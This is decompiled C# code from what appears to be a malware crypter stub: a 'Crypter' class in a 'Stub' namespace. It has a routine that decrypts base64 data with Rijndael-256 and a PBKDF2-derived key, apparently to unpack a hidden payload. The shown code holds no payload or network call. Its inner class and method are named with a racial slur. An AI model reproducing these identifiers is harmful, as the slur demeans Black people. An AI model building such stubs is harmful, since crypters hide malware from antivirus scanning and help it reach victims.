using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace Stub
{
	// Token: 0x0200000A RID: 10
	public static class Crypter
	{
		// Token: 0x0200000B RID: 11
		public static class Niggerified
		{
			// Token: 0x0600001E RID: 30 RVA: 0x00003E8C File Offset: 0x0000208C
			public static string Unniggerify(string cipherText, string passPhrase)
			{
				byte[] array = Convert.FromBase64String(cipherText);
				byte[] salt = array.Take(32).ToArray<byte>();
				byte[] rgbIV = array.Skip(32).Take(32).ToArray<byte>();
				byte[] array2 = array.Skip(64).Take(array.Length - 64).ToArray<byte>();
				string @string;
				using (Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passPhrase, salt, 1000))
				{
					byte[] bytes = rfc2898DeriveBytes.GetBytes(32);
					using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
					{
						rijndaelManaged.BlockSize = 256;
						rijndaelManaged.Mode = CipherMode.CBC;
						rijndaelManaged.Padding = PaddingMode.PKCS7;
						using (ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor(bytes, rgbIV))
						{
							using (MemoryStream memoryStream = new MemoryStream(array2))
							{
								using (CryptoStream cryptoStream = new CryptoStream(memoryStream, cryptoTransform, CryptoStreamMode.Read))
								{
									byte[] array3 = new byte[array2.Length];
									int count = cryptoStream.Read(array3, 0, array3.Length);
									memoryStream.Close();
									cryptoStream.Close();
									@string = Encoding.UTF8.GetString(array3, 0, count);
								}
							}
						}
					}
				}
				return @string;
			}

			// Token: 0x0600001F RID: 31 RVA: 0x00003FF4 File Offset: 0x000021F4
			public static byte[] Generate256BitsOfRandomEntropy()
			{
				byte[] array = new byte[32];
				using (RNGCryptoServiceProvider rngcryptoServiceProvider = new RNGCryptoServiceProvider())
				{
					rngcryptoServiceProvider.GetBytes(array);
				}
				return array;
			}

			// Token: 0x04000036 RID: 54
			private const int Keysize = 256;

			// Token: 0x04000037 RID: 55
			private const int DerivationIterations = 1000;
		}
	}
}
